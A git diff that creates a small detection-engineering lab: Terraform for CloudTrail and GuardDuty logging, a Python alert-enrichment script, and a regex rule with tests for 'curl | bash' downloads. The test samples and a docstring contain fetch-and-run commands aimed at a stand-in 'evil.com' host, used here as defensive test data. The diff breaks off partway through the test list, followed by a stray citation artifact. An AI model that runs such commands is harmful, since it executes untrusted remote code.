@@ -1,0 +1,382 @@
+diff --git a/README.md b/README.md
+new file mode 100644
+index 0000000..1111111
+--- /dev/null
++++ b/README.md
+@@ -0,0 +1,33 @@
++# Detection Engineering Mini Lab
++
++This repo contains small, practical examples of detection engineering concepts:
++
++- **Terraform** for enforcing security logging and GuardDuty in AWS.
++- **Python** for:
++  - Enriching alerts with EDR, Okta, and GeoIP data.
++  - Treating detections as code with a simple unit-test harness.
++
++The examples are intentionally small and focused so they can be used for:
++
++- Learning and experimentation
++- Interview demos
++- Building blocks for a larger environment
++
++## Structure
++
++```text
++.
++├── README.md
++├── .gitignore
++├── terraform/
++│   └── main.tf
++└── python/
++    ├── requirements.txt
++    ├── enrichment/
++    │   └── enrich_alert.py
++    └── detections/
++        ├── curl_pipe_bash_detection.py
++        └── test_curl_pipe_bash_detection.py
++```
++
++Use this as a sandbox to practice detection engineering, IaC, and security automation.
+diff --git a/.gitignore b/.gitignore
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/.gitignore
+@@ -0,0 +1,20 @@
++# Python
++__pycache__/
++*.pyc
++.venv/
++venv/
++
++# Terraform
++.terraform/
++*.tfstate
++*.tfstate.backup
++.terraform.lock.hcl
++
++# Environment / secrets
++.env
++*.log
++
++# OS / editor
++.DS_Store
++*.swp
++*.swo
+diff --git a/terraform/main.tf b/terraform/main.tf
+new file mode 100644
+index 0000000..3333333
+--- /dev/null
++++ b/terraform/main.tf
+@@ -0,0 +1,138 @@
++terraform {
++  required_version = ">= 1.5.0"
++
++  required_providers {
++    aws = {
++      source  = "hashicorp/aws"
++      version = "~> 5.0"
++    }
++  }
++}
++
++provider "aws" {
++  region = "us-west-2"
++}
++
++# S3 bucket for CloudTrail logs
++resource "aws_s3_bucket" "cloudtrail_logs" {
++  bucket = "org-cloudtrail-logs-example" # change to a globally-unique bucket name
++  acl    = "private"
++
++  versioning {
++    enabled = true
++  }
++
++  server_side_encryption_configuration {
++    rule {
++      apply_server_side_encryption_by_default {
++        sse_algorithm = "aws:kms"
++      }
++    }
++  }
++
++  lifecycle_rule {
++    enabled = true
++
++    transition {
++      days          = 90
++      storage_class = "GLACIER"
++    }
++  }
++}
++
++# CloudWatch log group for CloudTrail
++resource "aws_cloudwatch_log_group" "ct_logs" {
++  name              = "/aws/cloudtrail/org-trail"
++  retention_in_days = 365
++}
++
++# IAM role to allow CloudTrail to write to CloudWatch Logs
++resource "aws_iam_role" "ct_to_cw" {
++  name = "cloudtrail-to-cloudwatch-role"
++
++  assume_role_policy = jsonencode({
++    Version = "2012-10-17",
++    Statement = [
++      {
++        Effect = "Allow",
++        Principal = {
++          Service = "cloudtrail.amazonaws.com"
++        },
++        Action = "sts:AssumeRole"
++      }
++    ]
++  })
++}
++
++resource "aws_iam_role_policy" "ct_to_cw_policy" {
++  name = "cloudtrail-to-cloudwatch-policy"
++  role = aws_iam_role.ct_to_cw.id
++
++  policy = jsonencode({
++    Version = "2012-10-17",
++    Statement = [
++      {
++        Effect = "Allow",
++        Action = [
++          "logs:CreateLogStream",
++          "logs:PutLogEvents"
++        ],
++        Resource = "${aws_cloudwatch_log_group.ct_logs.arn}:*"
++      }
++    ]
++  })
++}
++
++# CloudTrail (can be org-wide if using AWS Organizations)
++resource "aws_cloudtrail" "org_trail" {
++  name                          = "org-trail"
++  s3_bucket_name                = aws_s3_bucket.cloudtrail_logs.id
++  include_global_service_events = true
++  is_multi_region_trail         = true
++  enable_log_file_validation    = true
++
++  # Uncomment if using AWS Organizations:
++  # is_organization_trail         = true
++
++  cloud_watch_logs_group_arn = aws_cloudwatch_log_group.ct_logs.arn
++  cloud_watch_logs_role_arn  = aws_iam_role.ct_to_cw.arn
++}
++
++# GuardDuty enabled in this region
++resource "aws_guardduty_detector" "main" {
++  enable = true
++}
++
++# EventBridge rule to forward high severity GuardDuty findings
++resource "aws_cloudwatch_event_rule" "guardduty_high" {
++  name        = "guardduty-high-findings"
++  description = "Route high severity GuardDuty findings to SIEM"
++
++  event_pattern = <<EOF
++{
++  "source": ["aws.guardduty"],
++  "detail-type": ["GuardDuty Finding"],
++  "detail": {
++    "severity": [ { "numeric": [ ">", 7 ] } ]
++  }
++}
++EOF
++}
++
++# Placeholder Lambda function to represent a SIEM forwarder.
++# In a real setup, you'd replace this with a proper Lambda package and role.
++resource "aws_lambda_function" "siem_forwarder" {
++  function_name = "siem-forwarder-placeholder"
++  role          = aws_iam_role.ct_to_cw.arn # placeholder; use a real Lambda role in production
++  handler       = "index.handler"
++  runtime       = "python3.11"
++  filename      = "lambda_placeholder.zip" # placeholder file
++}
++
++resource "aws_cloudwatch_event_target" "siem" {
++  rule      = aws_cloudwatch_event_rule.guardduty_high.name
++  target_id = "siem-forwarder"
++  arn       = aws_lambda_function.siem_forwarder.arn
++}
+diff --git a/python/requirements.txt b/python/requirements.txt
+new file mode 100644
+index 0000000..4444444
+--- /dev/null
++++ b/python/requirements.txt
+@@ -0,0 +1 @@
++requests>=2.32.0
+diff --git a/python/enrichment/enrich_alert.py b/python/enrichment/enrich_alert.py
+new file mode 100644
+index 0000000..5555555
+--- /dev/null
++++ b/python/enrichment/enrich_alert.py
+@@ -0,0 +1,96 @@
++import requests
++from datetime import datetime
++from typing import Dict, Any
++
++EDR_API = "https://edr.example.com/api/v1"
++OKTA_API = "https://okta.example.com/api/v1"
++GEOIP_API = "https://geoip.example.com/lookup"
++
++EDR_TOKEN = "edr-token-here"
++OKTA_TOKEN = "okta-token-here"
++
++
++def get_edr_process_tree(hostname: str, pid: int) -> Dict[str, Any]:
++    """Fetch process tree from EDR for a given host and pid."""
++    resp = requests.get(
++        f"{EDR_API}/processes/{hostname}/{pid}",
++        headers={"Authorization": f"Bearer {EDR_TOKEN}"},
++        timeout=5,
++    )
++    resp.raise_for_status()
++    return resp.json()
++
++
++def get_okta_user(user_id: str) -> Dict[str,Any]:
++    """Fetch Okta user profile details."""
++    resp = requests.get(
++        f"{OKTA_API}/users/{user_id}",
++        headers={"Authorization": f"SSWS {OKTA_TOKEN}"},
++        timeout=5,
++    )
++    resp.raise_for_status()
++    return resp.json()
++
++
++def get_geoip(ip: str) -> Dict[str, Any]:
++    """Look up IP address in GeoIP service."""
++    resp = requests.get(f"{GEOIP_API}?ip={ip}", timeout=5)
++    resp.raise_for_status()
++    return resp.json()
++
++
++def enrich_alert(alert: Dict[str, Any]) -> Dict[str, Any]:
++    """
++    Enrich a minimal alert with context from EDR, Okta, and GeoIP.
++
++    Expected alert input:
++    {
++        "user_id": "00u123...",
++        "src_ip": "1.2.3.4",
++        "hostname": "mac-123",
++        "pid": 1234,
++        "timestamp": "2025-11-19T20:00:00Z"
++    }
++    """
++    user = get_okta_user(alert["user_id"])
++    geo = get_geoip(alert["src_ip"])
++    process_tree = get_edr_process_tree(alert["hostname"], alert["pid"])
++
++    enriched = {
++        **alert,
++        "user_email": user.get("profile", {}).get("email"),
++        "user_department": user.get("profile", {}).get("department"),
++        "geo_country": geo.get("country"),
++        "geo_city": geo.get("city"),
++        "process_tree": process_tree,
++        "enriched_at": datetime.utcnow().isoformat() + "Z",
++    }
++
++    # Simple risk scoring example
++    risk = 0
++    if enriched["geo_country"] not in ("US", "CA"):
++        risk += 20
++    if user.get("status") == "PROVISIONED":  # never logged in before
++        risk += 20
++
++    enriched["risk_score"] = risk
++    return enriched
++
++
++if __name__ == "__main__":
++    # Minimal demo so you can run `python enrich_alert.py` locally.
++    # In a real environment, you would mock these APIs in tests.
++    example_alert = {
++        "user_id": "00u123abc",
++        "src_ip": "8.8.8.8",
++        "hostname": "mac-123",
++        "pid": 4242,
++        "timestamp": "2025-11-19T20:00:00Z",
++    }
++
++    try:
++        full = enrich_alert(example_alert)
++        print(full)
++    except Exception as exc:
++        print(f"[!] Enrichment failed (expected in demo without real APIs): {exc}")
+diff --git a/python/detections/curl_pipe_bash_detection.py b/python/detections/curl_pipe_bash_detection.py
+new file mode 100644
+index 0000000..6666666
+--- /dev/null
++++ b/python/detections/curl_pipe_bash_detection.py
+@@ -0,0 +1,18 @@
++import re
++
++
++DETECTION_REGEX = re.compile(r"curl\s+.*\|\s*bash", re.IGNORECASE)
++
++
++def detection_matches(command_line: str) -> bool:
++    """
++    Very simple detection rule:
++
++    Alert when a command line contains 'curl ... | bash',
++    a common pattern for one-liner install scripts.
++
++    In a real system, you'd make this more robust and integrate it
++    into a larger detection pipeline.
++    """
++    return bool(DETECTION_REGEX.search(command_line))
++
+diff --git a/python/detections/test_curl_pipe_bash_detection.py b/python/detections/test_curl_pipe_bash_detection.py
+new file mode 100644
+index 0000000..7777777
+--- /dev/null
++++ b/python/detections/test_curl_pipe_bash_detection.py
+@@ -0,0 +1,42 @@
++from typing import List, Dict
++
++from curl_pipe_bash_detection import detection_matches
++
++
++def run_detection_tests(samples: List[Dict]):
++    """
++    Each sample:
++    {
++        "cmd": "curl https://evil | bash",
++        "expected": True
++    }
++    """
++    failures = []
++    for sample in samples:
++        cmd = sample["cmd"]
++        expected = sample["expected"]
++        result = detection_matches(cmd)
++
++        if result != expected:
++            failures.append((cmd, expected, result))
++
++    if failures:
++        print("❌ Detection test failures:")
++        for cmd, exp, res in failures:
++            print(f"  cmd={cmd!r} expected={exp} got={res}")
++    else:
++        print("✅ All detection tests passed.")
++
++
++if __name__ == "__main__":
++    test_samples = [
++        {"cmd": "curl https://evil.com/install.sh | bash", "expected": True},
++        {"cmd": "curl https://example.com -o script.sh && bash script.sh", "expected": False},
++        {"
+
+::contentReference[oaicite:0]{index=0}
